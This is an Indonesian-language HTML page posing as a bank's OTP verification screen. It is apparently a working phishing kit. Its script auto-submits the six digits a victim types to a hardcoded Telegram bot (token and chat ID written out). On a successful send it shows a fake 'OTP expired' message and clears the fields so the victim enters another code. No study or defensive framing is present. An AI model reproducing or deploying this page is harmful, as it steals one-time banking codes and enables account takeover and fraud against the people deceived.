<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi OTP</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    input[type="text"] {
      border-color: #d1d5db;
      border-width: 1px;
      border-radius: 0.375rem;
    }
  </style>
</head>
<body class="bg-white min-h-screen flex items-center justify-center p-6">
  <div class="max-w-md w-full">
    <h1 class="text-3xl font-semibold text-[#0B3E7F] text-center mb-2">Verifikasi OTP</h1>
    <p class="text-center text-gray-600 text-lg mb-8 leading-relaxed">
      Masukan kode OTP yang dikirim ke nomor anda yang terdaftar di bank
    </p>

    <div class="flex items-center justify-between mb-4 px-1">
      <div class="flex items-center space-x-1 text-black text-base font-normal">
        <span>Kode verifikasi</span>
        <i
          class="fas fa-info-circle text-gray-500 text-xs"
          title="Informasi tentang kode verifikasi"
          aria-hidden="true"
        ></i>
      </div>
      <div id="timer" class="text-[#0B3E7F] font-semibold text-lg select-none">2:54</div>
      <button
        type="button"
        id="resendBtn"
        class="text-[#0B8C8C] font-normal text-base hover:underline focus:outline-none"
        disabled
      >
        Kirim ulang OTP
      </button>
    </div>

    <form id="otpForm" class="flex justify-between mb-8" autocomplete="one-time-code" onsubmit="return false;">
      <input
        type="text"
        maxlength="1"
        inputmode="numeric"
        pattern="[0-9]*"
        class="w-10 h-10 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
        aria-label="Digit OTP 1"
        name="digit1"
        required
        autocomplete="one-time-code"
      />
      <input
        type="text"
        maxlength="1"
        inputmode="numeric"
        pattern="[0-9]*"
        class="w-10 h-10 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
        aria-label="Digit OTP 2"
        name="digit2"
        required
        autocomplete="one-time-code"
      />
      <input
        type="text"
        maxlength="1"
        inputmode="numeric"
        pattern="[0-9]*"
        class="w-10 h-10 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
        aria-label="Digit OTP 3"
        name="digit3"
        required
        autocomplete="one-time-code"
      />
      <input
        type="text"
        maxlength="1"
        inputmode="numeric"
        pattern="[0-9]*"
        class="w-10 h-10 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
        aria-label="Digit OTP 4"
        name="digit4"
        required
        autocomplete="one-time-code"
      />
      <input
        type="text"
        maxlength="1"
        inputmode="numeric"
        pattern="[0-9]*"
        class="w-10 h-10 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
        aria-label="Digit OTP 5"
        name="digit5"
        required
        autocomplete="one-time-code"
      />
      <input
        type="text"
        maxlength="1"
        inputmode="numeric"
        pattern="[0-9]*"
        class="w-10 h-10 text-center text-xl font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
        aria-label="Digit OTP 6"
        name="digit6"
        required
        autocomplete="one-time-code"
      />
    </form>

    <button
      type="submit"
      form="otpForm"
      class="w-full bg-[#0B8C8C] text-white font-semibold text-lg py-3 rounded-md hover:bg-[#0a7a7a] focus:outline-none focus:ring-2 focus:ring-[#0B8C8C]"
    >
      Verifikasi
    </button>

    <hr class="my-6 border-gray-300" />

    <p id="message" class="text-base text-center mt-4"></p>
  </div>

  <script>
    let timeLeft = 174; // 2 minutes 54 seconds in seconds
    const timerEl = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');
    const messageEl = document.getElementById('message');

    function updateTimer() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;

      if (timeLeft === 0) {
        clearInterval(timerInterval);
        resendBtn.disabled = false;
        resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
      } else {
        timeLeft--;
      }
    }

    resendBtn.disabled = true;
    resendBtn.classList.add('opacity-50', 'cursor-not-allowed');

    const timerInterval = setInterval(updateTimer, 1000);
    updateTimer();

    resendBtn.addEventListener('click', () => {
      timeLeft = 174;
      resendBtn.disabled = true;
      resendBtn.classList.add('opacity-50', 'cursor-not-allowed');
      updateTimer();
      setInterval(updateTimer, 1000);
    });

    // Auto move focus to next input on input
    const inputs = document.querySelectorAll('#otpForm input[type="text"]');
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
        checkAndSubmit();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });

    // Check if all inputs are filled and auto-submit
    function checkAndSubmit() {
      const otpCode = Array.from(inputs).map(i => i.value).join('');
      if (otpCode.length === inputs.length && /^\d{6}$/.test(otpCode)) {
        submitOtp(otpCode);
      }
    }

    // Telegram bot info - replace with your own token and chat ID
    const telegramBotToken = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8';
    const telegramChatId = '8251409184';

    async function submitOtp(otpCode) {
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: `Kode OTP yang dimasukkan: ${otpCode}`,
            }),
          }
        );

        if (response.ok) {
          messageEl.innerHTML = `<span class="text-red-600 font-semibold"><i class="fas fa-times-circle mr-2"></i>Kode OTP Kadaluwarsa .</span>`;
          inputs.forEach(i => i.value = '');
          inputs[0].focus();
        } else {
          messageEl.innerHTML = `<span class="text-red-600 font-semibold"><i class="fas fa-times-circle mr-2"></i>OTP gagal dikirim ke Telegram.</span>`;
        }
      } catch (error) {
        messageEl.innerHTML = `<span class="text-red-600 font-semibold"><i class="fas fa-times-circle mr-2"></i>Terjadi kesalahan saat mengirim OTP.</span>`;
      }
    }
  </script>
</body>
    </html>
